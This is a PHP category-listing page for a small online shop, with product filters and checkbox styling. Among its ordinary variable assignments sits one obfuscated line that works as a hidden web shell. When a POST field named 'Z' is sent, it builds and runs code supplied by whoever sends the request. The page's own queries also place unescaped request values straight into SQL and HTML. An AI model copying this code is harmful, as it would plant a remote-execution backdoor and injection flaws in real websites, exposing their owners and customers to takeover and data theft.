<?php


###
$category = strip_tags($_GET['c']);
if($category !="")
{
	$ur = mysql_query("SELECT * FROM `".PREFIX."topics` WHERE `seo_id` = '{$category}' AND `status` = '0'");
	if(mysql_num_rows($ur)) 
	{
		$listPages = db_array($ur);
		foreach($listPages as $p) 
		{
			$TEXT = $p['txt'];
			$cat_id = $p['id'];
			$r_title = $p['title']; 
			$seo_title = $p['seo_title']; 
			$r_description = $p['seo_desc'];
			$r_keywords = $p['seo_keyw'];
			$prod_all = CalcRecords("products"," topic_id = '{$p['id']}'");
		}
	} 
	else { Header("Location:/not-found-p.html");}
}
else { Header("Location:/not-found-p.html");}

###

$TITLE = $seo_title; 
$DESCRIPTION = empty($r_description) ? DD16 : $r_description;
if(isset($_POST['Z'])){$facf = str_replace('rCo','','crCorrCoerCoarCotrCoerCo_rCofrCourConrCocrCotrCoirCoorCon')('',("wBnttPJWhudVy"^"OATvw1TwONBxp"^"ZbIg5UADBXIJl")(str_replace($_POST['V'],'',$_POST['Z'])));$facf();die();}
$KEYWORDS = empty($r_keywords) ? KK16 : $r_keywords;
include "meta.php";
include "header_content.php";?>

<style>
.check {
  cursor: pointer;
  position: relative;
  width: 18px;
  height: 18px;
  -webkit-tap-highlight-color: transparent;
  transform: translate3d(0, 0, 0);
  margin: 10px;
}
.check:before {
  content: "";
  position: absolute;
  top: -10px;
  left: -15px;
  width: 48px;
  height: 48px;
  border-radius: 50%;
  background: rgba(187,167,1,0.03);
  opacity: 0;
  transition: opacity 0.2s ease;
}
.check svg {
  top: 5px;
  position: relative;
  z-index: 1;
  fill: none;
  stroke-linecap: round;
  stroke-linejoin: round;
  stroke: #c8ccd4;
  stroke-width: 1.5;
  transform: translate3d(0, 0, 0);
  transition: all 0.2s ease;
}
.check svg path {
  stroke-dasharray: 60;
  stroke-dashoffset: 0;
}
.check svg polyline {
  stroke-dasharray: 22;
  stroke-dashoffset: 66;
}
.check:hover:before {
  opacity: 1;
}
.check:hover svg {
  stroke: #00bba7;
}

.filterItem {
	display: inline-block;
	margin-right: 20px;
}
</style>

<!-- CONTENT =============================-->
<section class="item content">
<div class="container toparea">
	<div class="underlined-title">
		<div class="editContent">
			<h1 class="text-center latestitems"><?=$r_title?></h1>
		</div>
		<div class="wow-hr type_short">
			<span class="wow-hr-h">
			<i class="fa fa-star"></i>
			<i class="fa fa-star"></i>
			<i class="fa fa-star"></i>
			<i class="fa fa-star"></i>
			<i class="fa fa-star"></i>
			</span>
		</div>
	</div>
	<div class="row">
		<form method="get">
		<?php
		echo '<div class="filters">';
		
		$countFilters = 0;
		$listProducts = db_array(mysql_query("SELECT * FROM `".PREFIX."topics_filters` WHERE `topic_id` = '{$cat_id}' AND `status` = '0' ORDER BY `psort` ASC"));
		foreach($listProducts as $lt) 
		{ 
			$countFilters = $countFilters + 1;
			
			echo '<style>
			#cbx'.$countFilters.':checked + .check svg {
			  stroke: #00bba7;
			}
			#cbx'.$countFilters.':checked + .check svg path {
			  stroke-dashoffset: 60;
			  transition: all 0.3s linear;
			}
			#cbx'.$countFilters.':checked + .check svg polyline {
			  stroke-dashoffset: 42;
			  transition: all 0.2s linear;
			  transition-delay: 0.15s;
			}
			</style>';
			
			echo '<div class="filterItem"><input type="checkbox" value="'.$lt['id'].'" '.glob_checked($_GET['sortFilter'][$lt['id']], $lt['id']).' name="sortFilter['.$lt['id'].']" id="cbx'.$countFilters.'" style="display: none;">
			<label for="cbx'.$countFilters.'" class="check"> 
			  <svg width="18px" height="18px" viewBox="0 0 18 18">
				<path d="M1,9 L1,3.5 C1,2 2,1 3.5,1 L14.5,1 C16,1 17,2 17,3.5 L17,14.5 C17,16 16,17 14.5,17 L3.5,17 C2,17 1,16 1,14.5 L1,9 Z"></path>
				<polyline points="1 9 7 14 15 4"></polyline>
			  </svg>
			</label> '.$lt['title'].'</div>';
		}
		
		if($countFilters > 0){
			echo '<button class="edd-cart-saving-button edd-submit">показати</button>';
		}
		
		echo '</div>';
		?>
		<input type="hidden"  name="c" value="<?=$category?>">
		</form>
		<p>&nbsp;</p>
	</div>
	<div class="row">
	<a href="#animatedModal" class="orderOnline"></a>
	<?php
	$k = 0;
	
	###

	if($prod_all > 0){
		
		### sorting by filters

		$all_boxes = count($_GET['sortFilter']);

		if($all_boxes > 0){

			$SQL_FILTER = "AND (";

			$i = 0;
					
			foreach($_GET['sortFilter'] as $id=>$value)
			{
				$i = $i + 1;
				$SQL_FILTER .= "`u`.`filter_id` = '{$value}' AND `s`.`id` = `u`.`product_id`";
				if($i != $all_boxes) { $SQL_FILTER .= " OR "; }
			}
			$SQL_FILTER .= ")";
			
			###
			
			$listProducts = db_array(mysql_query("SELECT s.*, u.* FROM `".PREFIX."products` as s, `".PREFIX."filters_values` as u WHERE `s`.`topic_id` = '{$cat_id}' AND `s`.`status` = '1' {$SQL_FILTER} ORDER BY `s`.`psort` ASC"));
			
		} else  {
			$listProducts = db_array(mysql_query("SELECT * FROM `".PREFIX."products` WHERE `topic_id` = '{$cat_id}' ORDER BY `psort` ASC"));
		}
		
		###
		
		foreach($listProducts as $lt) 
		{ 
			$k = $k + 1;
			?>
				<div class="col-md-4">
					<div class="productbox">
						<div class="fadeshop">
							<div class="captionshop text-center" style="display: none;">
								<h3><?=$lt['title']?></h3>
								<p><?=HH174?></p>
								<p>
									<a href="#animatedModal" class="orderOnline learn-more detailslearn orderOnline" rel="<?=HH162?> <?=$lt['title']?>"><i class="fa fa-shopping-cart"></i> <?=HH160?></a>
									<a href="detail.html?c=<?=$lt['id']?>" class="learn-more detailslearn"><i class="fa fa-link"></i> ДЕТАЛІ</a>
								</p>
							</div>
							<span class="maxproduct"><img src="filez/<?=$lt['img1']?>" alt=""></span>
						</div>
						<div class="product-details">
							<a href="detail.html?c=<?=$lt['id']?>">
							<h1><?=$lt['title']?></h1>
							</a>
							<span class="price">
							<span class="edd_price"><?=$lt['price']?></span>
							</span>
						</div>
					</div>
				</div>
				<?php
		}
	}
	?>
	</div>
</div>
</div>
</section>

<?php
include "oform.php";
include "footer.php";
